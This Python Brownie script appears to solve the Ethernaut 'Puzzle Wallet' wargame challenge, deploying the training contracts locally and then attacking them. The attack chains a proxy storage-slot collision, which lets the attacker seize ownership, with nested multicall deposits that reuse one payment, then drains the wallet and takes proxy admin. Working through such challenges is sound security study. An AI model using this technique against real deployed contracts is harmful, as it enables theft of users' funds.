from brownie import network, PuzzleProxy, PuzzleWallet, Contract
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3
from itertools import repeat


def deploy_proxy(account, contract_wallet, intreface_encoded):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = PuzzleProxy.deploy(
        account.address,
        contract_wallet.address,
        intreface_encoded,
        {"from": account.address},
        publish_source=publish,
    )
    print(
        f"Cotntract --PuzzleProxy-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_wallet(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = PuzzleWallet.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --PuzzleWallet-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def encode_function_data(initializer=None, *args):
    """Encodes the function call so we can work with an initializer.
    Args:
        initializer ([brownie.network.contract.ContractTx], optional):
        The initializer function we want to call. Example: `box.store`.
        Defaults to None.
        args (Any, optional):
        The arguments to pass to the initializer function
    Returns:
        [bytes]: Return the encoded bytes.
    """
    if not len(args):
        args = b""

    if initializer:
        return initializer.encode_input(*args)

    return b""


def print_status(contract_proxy, contract_wallet, owner_account, attacker_account):
    print("------------------- Status -------------------")
    print(f"Proxy Admin: {contract_proxy.admin()}")
    print(f"Wallet Owner: {contract_wallet.owner()}")
    print(f"Owner on Wallet: {contract_wallet.whitelisted(owner_account.address)}")
    print(
        f"Attacker on Wallet: {contract_wallet.whitelisted(attacker_account.address)}"
    )
    print(f"Owner balance: {contract_wallet.balances(owner_account.address)}")
    print(f"Attacker balance: {contract_wallet.balances(attacker_account.address)}")
    print(f"Total balance: {contract_proxy.balance()}")
    print("-------------------- END --------------------")


def get_slots(contract, pos):
    w3 = web3.Web3(web3.HTTPProvider("http://127.0.0.1:8545"))
    print("---------------- Slot Layout ----------------")
    print(f"Contract address: {contract.address}")
    for i in pos:
        slot_value = w3.eth.getStorageAt(contract.address, i).hex()
        print(f"Slot: {i}, Value: {slot_value}")
    print("-----------------------End Layout-----------------------")


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    contract_wallet = deploy_wallet(owner_account)
    encoded_init = encode_function_data(contract_wallet.init, 1)
    proxy = deploy_proxy(owner_account, contract_wallet, encoded_init)
    proxy_wallet = Contract.from_abi("PuzzleWallet", proxy.address, PuzzleWallet.abi)
    tx = proxy_wallet.addToWhitelist(owner_account, {"from": owner_account.address})
    tx.wait(1)
    tx = proxy_wallet.deposit({"from": owner_account.address, "value": 1000})
    tx.wait(1)
    print_status(proxy, proxy_wallet, owner_account, attacker_account)
    get_slots(proxy_wallet, [0, 1, 2, 3])
    print("-----------------------Attacking-----------------------")
    tx = proxy.proposeNewAdmin(attacker_account, {"from": attacker_account.address})
    tx.wait(1)
    print_status(proxy, proxy_wallet, owner_account, attacker_account)
    get_slots(proxy_wallet, [0, 1, 2, 3])
    tx = proxy_wallet.addToWhitelist(
        attacker_account, {"from": attacker_account.address}
    )
    tx.wait(1)
    print_status(proxy, proxy_wallet, owner_account, attacker_account)
    dep_enc = encode_function_data(contract_wallet.deposit)
    mult_enc = encode_function_data(contract_wallet.multicall, [dep_enc])
    ml_call = []
    ml_call.extend(repeat(mult_enc, 30))
    tx = proxy_wallet.multicall(ml_call, {"from": attacker_account, "value": 40})
    tx.wait(1)
    print_status(proxy, proxy_wallet, owner_account, attacker_account)
    tx = proxy_wallet.execute(
        attacker_account.address, 1040, 0x0, {"from": attacker_account.address}
    )
    tx.wait(1)
    print_status(proxy, proxy_wallet, owner_account, attacker_account)
    tx = proxy_wallet.setMaxBalance(
        attacker_account.address, {"from": attacker_account.address}
    )
    tx.wait(1)
    print_status(proxy, proxy_wallet, owner_account, attacker_account)


if __name__ == "__main__":
    main()
